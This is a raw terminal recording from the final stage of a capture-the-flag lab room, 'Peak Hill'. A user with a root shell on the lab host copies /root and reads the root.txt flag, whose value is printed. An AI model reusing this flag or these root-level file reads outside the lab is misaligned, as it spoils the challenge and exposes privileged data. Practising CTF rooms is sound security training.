+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# ./asd
+bash: ./asd: Permission denied
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cp * cd[K[K/home/dill
+cp: cannot stat '*': No such file or directory
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cp * /home/dill[C[C[C[C[C[C[C[C[C[C[C[1P /home/dill- /home/dillr /home/dill[C /home/dillr /home/dillo /home/dillo /home/dillt /home/dill
+cp: cannot stat 'root': No such file or directory
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cp -r root /home/dill[C[1@/
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cd [K
+]0;root@ubuntu-xenial: ~[01;32mroot@ubuntu-xenial[00m:[01;34m~[00m# ls
+[0m[01;34mroot[0m  user.txt
+]0;root@ubuntu-xenial: ~[01;32mroot@ubuntu-xenial[00m:[01;34m~[00m# cd root/
+]0;root@ubuntu-xenial: ~/root[01;32mroot@ubuntu-xenial[00m:[01;34m~/root[00m# ls
+asd   root.txt 
+]0;root@ubuntu-xenial: ~/root[01;32mroot@ubuntu-xenial[00m:[01;34m~/root[00m# cat t[Kro[K[K[K[K[K[Kcd [K[K[Kls -la
+total 28
+drwx------ 4 root root 4096 Apr  2 21:01 [0m[01;34m.[0m
+drwxr-xr-x 6 dill dill 4096 Apr  2 21:01 [01;34m..[0m
+-rw-r--r-- 1 root root    0 Apr  2 21:01 asd
+-rw-r--r-- 1 root root 3106 Apr  2 21:01 .bashrc
+drwxr-xr-x 2 root root 4096 Apr  2 21:01 [01;34m.nano[0m
+-rw-r--r-- 1 root root  148 Apr  2 21:01 .profile
+-r--r----- 1 root root   33 Apr  2 21:01  root.txt 
+drwx------ 2 root root 4096 Apr  2 21:01 [01;34m.ssh[0m
+]0;root@ubuntu-xenial: ~/root[01;32mroot@ubuntu-xenial[00m:[01;34m~/root[00m# cat   root.txt 
+e88f0a01135c05cf0912cf4bc335ee28
+]0;root@ubuntu-xenial: ~/root[01;32mroot@ubuntu-xenial[00m:[01;34m~/root[00m# cat roo[K[K[K[K  root.txt
+cat:  root.txt: No such file or directory
+]0;root@ubuntu-xenial: ~/root[01;32mroot@ubuntu-xenial[00m:[01;34m~/root[00m# cat  root.txt
+cat:  root.txt: No such file or directory
+]0;root@ubuntu-xenial: ~/root[01;32mroot@ubuntu-xenial[00m:[01;34m~/root[00m#   root.txt[K[K[K[K[K[K[K[K[K[Kcat   root.txt
+cat:  root.txt: No such file or directory
+]0;root@ubuntu-xenial: ~/root[01;32mroot@ubuntu-xenial[00m:[01;34m~/root[00m# cat   root.txt
+cat:  root.txt: No such file or directory
+]0;root@ubuntu-xenial: ~/root[01;32mroot@ubuntu-xenial[00m:[01;34m~/root[00m# cat   root.txt
+cat:  root.txt: No such file or directory
+]0;root@ubuntu-xenial: ~/root[01;32mroot@ubuntu-xenial[00m:[01;34m~/root[00m# cat   root.txt
+cat:  root.txt: No such file or directory
+]0;root@ubuntu-xenial: ~/root[01;32mroot@ubuntu-xenial[00m:[01;34m~/root[00m# ls
+asd   root.txt 
+]0;root@ubuntu-xenial: ~/root[01;32mroot@ubuntu-xenial[00m:[01;34m~/root[00m# cd /
+]0;root@ubuntu-xenial: /[01;32mroot@ubuntu-xenial[00m:[01;34m/[00m# cd root/
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# ls
+asd   root.txt 
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# cat   root.txt  
+e88f0a01135c05cf0912cf4bc335ee28
+]0;root@ubuntu-xenial: /root[01;32mroot@ubuntu-xenial[00m:[01;34m/root[00m# Connection to 10.10.112.107 closed by remote host.
+Connection to 10.10.112.107 closed.
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ cd [K[K[Kexit
+exit
+Script done, file is terminal2
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_peak_hill[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_peak_hill[00m$ exit
+exit
+
+Script done on 2021-04-03 02:38:19+05:30 [COMMAND_EXIT_CODE="0"]
